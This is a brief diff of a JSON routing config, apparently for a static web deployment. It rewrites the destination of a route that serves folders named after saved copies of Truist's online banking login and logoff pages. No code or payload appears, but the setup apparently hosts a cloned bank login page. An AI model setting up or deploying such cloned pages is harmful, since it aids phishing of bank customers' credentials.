@@ -7,7 +7,7 @@
     "routes": [
         {
             "src": "/(Logoff _ Truist_files|Truist Online Banking Login _ Truist_files|vendor)/(.*)",
-            "dest": "/$1/$2/$3"
+            "dest": "/$1"
         }
       ]
     
